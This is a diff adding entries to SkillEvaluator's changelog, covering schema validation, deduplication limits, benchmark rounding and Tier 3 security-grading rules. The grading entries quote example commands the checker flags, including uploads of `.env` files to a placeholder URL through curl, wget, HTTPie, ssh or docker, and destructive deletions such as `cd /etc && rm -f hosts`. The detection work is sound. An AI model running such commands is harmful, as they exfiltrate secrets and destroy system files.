@@ -109,6 +109,17 @@ All notable changes to SkillEvaluator are documented in this file.
   expected-case checks cover only the cases that ran, `run_config.json` records
   the selection as `case_selection`, and a run that skipped cases is reported
   as publication-incomplete in JSON, HTML, and BENCHMARK.md.
+- Tier 1 schema validation accepts a list for `metadata.domain` in `SKILL.md`
+  (for example `domain: [backend, ai-ml]`) instead of reporting a HIGH
+  `Input should be a valid string` finding that also stopped the remaining
+  schema checks for that skill. A single string is still accepted and is
+  treated as a one-entry list. The parsed value is now always a list: entries
+  are trimmed and deduplicated in order, and a missing, null, or blank value
+  becomes an empty list. Lists longer than 16 entries and non-string, blank, or
+  over-128-character entries are rejected. This adds a length limit that
+  `metadata.domain` did not have before: a single string longer than 128
+  characters, which used to pass, now fails Tier 1 with a HIGH
+  `Field 'metadata.domain'` finding.
 - `doctor` and `health-check` take `--tier 1|2|3|all`, so Tier 1 and Tier 2
   readiness can be checked before a run instead of surfacing mid-validation.
   Tier 1 reports each scanner that the `--checks` selection runs: SkillSpector,
@@ -276,6 +287,21 @@ All notable changes to SkillEvaluator are documented in this file.
 - CI quality thresholds apply to every parallel scan worker. Report overviews
   and detailed reports surface failed quality gates ahead of advisory findings,
   with links to the check that needs attention.
+- When `validate` finds an unusable Tier 3 source, the terminal and HTML
+  report now say which entries or files failed and why, instead of only
+  "Create or fix the Tier 3 source ... and rerun validation." The terminal
+  lists the errors under the Tier 3 finding when the full CLI report prints
+  (`-r cli` or `--verbose`) and otherwise in the compact Tier 3 panel. When
+  the run also writes an HTML or JSON report, the terminal shows the first
+  five and names that report for the rest; when it writes neither (for example
+  `-r cli` alone, or `--verbose` without `-r`), the terminal lists every
+  error. The HTML dashboard shows a single error in full or the error count,
+  and Full Insights lists every error under Source Validation Errors. The
+  errors come from the skill's eval files, so they are printed as plain text
+  with terminal control sequences removed. Passing checks and warnings are not
+  listed. The JSON report still carries every error under
+  `tier3.provenance.source_validation`. Validation rules, gate decisions, and
+  the finding's suggestion text are unchanged.
 - Tier 2 caps every intra-skill embedding chunk at 3,000 characters, preserves
   meaningful short tails and actual Python docstring source ranges, and avoids
   counting pieces of one original chunk as duplicates of each other. Oversized
@@ -290,6 +316,15 @@ All notable changes to SkillEvaluator are documented in this file.
   report's `llm_analysis` counts it in `clusters_refused`. Other chat-LLM
   failures still leave the scan incomplete. Raise `CONTENT_DEDUP.llm_refused`
   in a policy overlay to keep refusals blocking.
+- Tier 2 context deduplication no longer stops valid skills at the
+  `scalar_comparison_limit` work limit below its 512-chunk ceiling. The fixed
+  25,000,000 scalar-comparison budget stopped 2,048-dimensional embeddings at
+  156 chunks and 1,536-dimensional embeddings at 180. The budget is now
+  267,911,168, so embeddings of up to 2,048 dimensions reach all 512 chunks.
+  Wider embeddings have a lower effective chunk limit (418 chunks at 3,072
+  dimensions, 362 at 4,096), which the incomplete-scan error and the JSON
+  `work_limit` record now report as `effective_chunk_limit`, next to the
+  skill's own `chunk_count`.
 - Local-mode verifier uploads now copy directly to the absent destination,
   avoiding an unnecessary rollback snapshot of an empty tests directory.
   Inputs and rewritten scripts are prepared privately before publication,
@@ -379,6 +414,29 @@ All notable changes to SkillEvaluator are documented in this file.
   Static reports are accepted when a provider is available but LLM analysis
   was neither requested nor applied; availability alone is not execution.
 
+- `BENCHMARK.md` score transitions round half-up to one decimal place, keep
+  extra decimals for a score near a dimension verdict threshold so it is never
+  shown in a higher band (`49.95%`, not `50.0%`), and derive uplift from the
+  displayed scores. Whole-percent rounding of each value separately had
+  published contradictions such as `58% → 95% (+36 points)` and
+  `50% → 50% (+0 points)`. Scores outside 0–1 and invalid recorded baselines
+  are shown as `Not available` instead of being published. The public
+  benchmark gate (`scripts/ci/check_public_benchmarks.py`) now rejects a
+  Results at a Glance cell whose uplift does not equal the displayed difference
+  or whose scores are outside 0–100%; consistent whole-number cards from
+  earlier releases still pass.
+
+- Tier 3 `custom_only` runs no longer label a condition without a scoreable
+  reward, for example one whose attempts all failed, with the standard metric
+  set and `skill-evaluator-dimension-mean-v1` policy. That condition's
+  `summary.json`, the agent's recorded metrics and score policies,
+  `attempt_policy.json`, and the report's score definition now carry the
+  `custom-only` metric set and `custom-overall-v1` policy. When a Harbor job
+  never started, both conditions' persisted `summary.json` files record that
+  metric set and policy. A failed custom-only agent is therefore no longer
+  treated as a standard agent. Scores were already cleared for these
+  conditions, and observed rewards still determine their own metric set.
+
 - PII email scans recognize all RFC 2606 reserved domains, including their
   subdomains, mixed-case forms, trailing dots, and prose ellipses. A local-part
   boundary prevents quadratic rescanning of long excluded addresses. Ordinary
@@ -397,6 +455,24 @@ All notable changes to SkillEvaluator are documented in this file.
   BENCHMARK.md, and a policy severity override could downgrade them into a pass
   with no duplicate analysis. Exit codes are otherwise unchanged. An execution
   error names the limit, and the JSON report records it under `work_limit`.
+
+- Tier 3 security grading no longer treats `rm -f` or `rm --force` without
+  `-r`, `-R`, or `--recursive` as a destructive command. Routine cleanup such as
+  `rm -f out.txt && python run.py` or `find . -name '*.pyc' -exec rm -f {} \;`
+  received a critical destructive-command finding and a security score of 0.0
+  in both graders, which could fail the Security dimension and the Tier 3
+  verdict. Force-only deletion keeps the finding when a target resolves under
+  `/bin`, `/boot`, `/etc`, `/home`, `/lib*`, `/root`, `/sbin`, `/usr`, or
+  `/var` (except `/var/tmp`), or under `~` or `$HOME`. Brace lists and dot
+  globs are expanded first, `find -exec rm -f {}` is checked against find's
+  start paths, and a relative target resolves against the directory that the
+  tool call's `workdir` and each earlier `cd`, `pushd`, or `popd` leave the
+  shell in, so `find / -exec rm -f {} +` and `cd /etc && rm -f hosts` keep the
+  finding while `(cd /etc && ls); rm -f out.txt` and
+  `echo 'run: cd /etc'; rm -f out.txt` do not. This resolution has a
+  per-trace work cap; past it, force-only targets keep the finding, as do
+  relative targets after one call moves through more than 32 directories.
+  Recursive deletion and `xargs rm -f` are graded as before.
 
 - Tier 3 security grading preserves ordinary nested `/tmp` cleanup, including
   child operands with trailing slashes, unless the current or an earlier
@@ -510,6 +586,16 @@ All notable changes to SkillEvaluator are documented in this file.
   image formats, files without that structure, and every other partial reason
   still leave the scan `INCOMPLETE`. SkillSpector's own High `AE1` findings for
   images it could not inspect are unchanged.
+- Tier 3 `--stop-on-pass` runs with local-mode Codex no longer fail to finalize
+  when Harbor's best-effort Codex cleanup is skipped, for example after a
+  timeout or cancellation. Merging the per-attempt jobs now omits the leftover
+  `codex-home` and `codex-secrets` directories in each trial's `agent/` or
+  `steps/<step>/agent/` directory, including steps whose names span several
+  path components, such as `phase/author`, as declared in the trial's
+  `result.json`. Their linked `auth.json` made the merge fail closed, and a
+  regular-file `auth.json` was copied into the merged job with the Codex
+  credential. Symlink and hard-link checks still apply everywhere else,
+  including to the same names at any other depth.
 - A `SKILL.md` over the recommended 5,000-token budget now gets a MEDIUM
   `quality_efficiency` finding instead of a HIGH one. The HIGH finding failed
   the quality check, and with it `validate`, `tier1`, and `quality-check`, even
@@ -525,6 +611,52 @@ All notable changes to SkillEvaluator are documented in this file.
   `SKILLSPECTOR_PROVIDER=nv_build` gets the same mapping. The key still reaches
   SkillSpector only as `OPENAI_API_KEY`, with `OPENAI_BASE_URL` set to the
   public Build endpoint.
+- Tier 3 security grading no longer reports a network-exfiltration warning,
+  which lowered the Security score to 0.5, when a command only names `curl`,
+  `wget`, or HTTPie as data: `apt-get install -y curl`, `which curl`,
+  `grep -rn http src/`, `env | grep -i http`, or a client mentioned in a shell
+  comment or here-document prose. Every client named after another command is
+  now checked with its own upload rules, as for a direct invocation, so
+  `find . -exec curl -d @{} URL \;`, `poetry run curl -T .env URL`, and
+  `find . -name wget -exec curl -d @.env URL \;` still warn, while a plain
+  request through a command that is not a runner, such as `strace -f curl URL`
+  or `find . -exec curl URL \;`, is now scored like a direct `curl URL`. A
+  mention followed by an HTTP method, an upload flag, or a `key=value` word,
+  such as `http POST` in prose, still warns.
+  A fixed set of runners that start a command in another host, container, root,
+  user, or network namespace, such as `ssh`, `docker`, `docker-compose`,
+  `kubectl`, `apptainer`, `chroot`, `systemd-nspawn`, `bwrap`, or
+  `ip netns exec`, warns on any client named after it, even one named only as
+  data, as in `docker exec app apt-get install -y curl`. That holds when the
+  runner is the command itself, including after a compound keyword, function
+  header, `case` pattern, or `coproc`, also when glued to it
+  (`while true; do ssh host curl URL; done`, `if(ssh host curl URL)`,
+  `case x in x)ssh host curl URL;; esac`), when it follows a pass-through
+  wrapper such as `strace`, `ionice`, `flock`, or `watch`, and when a function
+  that wraps it is called. A runner reached through another command, as in
+  `find . -exec ssh host curl URL \;` or
+  `git submodule foreach ssh host curl URL`, and a runner outside the set are
+  checked only with the client's upload rules.
+  Piped or redirected input stays with a text consumer such as `grep`, `awk`,
+  `sed`, or `jq`; any other command, loop, `if`, `{ ...; }` group, or function
+  body may pass it on, so `cat .env | strace -f http URL`, `< .env http URL`,
+  `sudo < .env http URL`, `2>&1 < .env http URL`,
+  `case "$1" in *) < .env http URL;; esac`, and
+  `while read -r l; do http URL; done < .env` still warn. A function that wraps
+  a client, as in `up() { curl "$@"; }; up -d @.env URL` or
+  `up(){ curl "$@"; }; up -d @.env URL`, is checked with that client's rules,
+  and a `$VAR` command word with no known value, in an action that names curl
+  or wget as a word, gets the curl and wget upload rules, as in
+  `for c in curl wget; do $c --post-file=.env -q URL; done`. A substitution any of
+  whose commands names a client or runner, such as `$(which curl)`,
+  `$(env which curl)`, `$(cd /tmp && which curl)`,
+  `$(command -v curl 2>/dev/null)`, `$(readlink -f $(which curl))`, or
+  `$(which ssh)`, and `$CURL` after a plain, `export`, `declare`, `read`, or
+  `printf -v` assignment, resolve to that command; a fallback chain such as
+  `$(command -v wget || command -v curl)` is checked once for each name. A
+  command printed by `$(echo curl -d @.env URL)` or `$(printf ...)` keeps its
+  printed arguments. Both the host checker and the bundled Harbor verifier
+  apply these rules.
 - Tier 3 plain progress output, which `--progress auto` selects for CI and
   redirected logs, now repeats its `still running` heartbeat every 60 seconds
   instead of every second, so long runs no longer add thousands of identical
@@ -541,6 +673,19 @@ All notable changes to SkillEvaluator are documented in this file.
   forwarded to SkillSpector so its own deadline can be raised as well, and the
   security result records the effective `skillspector_timeout_seconds`
   ([#155](https://github.com/NVIDIA/SkillEvaluator/issues/155)).
+- `similarity-check --catalog` and `tier2 --catalog` no longer report a skill
+  that is already in the local catalog as an `EXACT_DUPLICATE` of its own
+  entry, which failed the run. An entry is skipped as the skill's own only when
+  its content fingerprint matches, its path ends the skill's path, and more
+  than half of up to eight other catalog skills, spread evenly across the
+  catalog's path-sorted list, are present unchanged at their recorded paths
+  around it. The skip is recorded under
+  `self_matches_excluded` and `excluded_catalog_paths`. Verbatim copies and
+  same-name skills outside the catalog's tree are still reported; a copy of
+  most of the tree, such as a second checkout, counts as the same tree. An
+  edited skill whose name, description, or (with `--full-body`) `SKILL.md`
+  changed is still compared with its old entry; build the catalog from the tree
+  you screen.
 - Ctrl+C during `tier3 evaluate` now stops the run. The interrupt reached only
   the coordinating thread, so running Harbor jobs kept going in their own
   process groups, agents waiting for a `--max-agents` slot still started, and
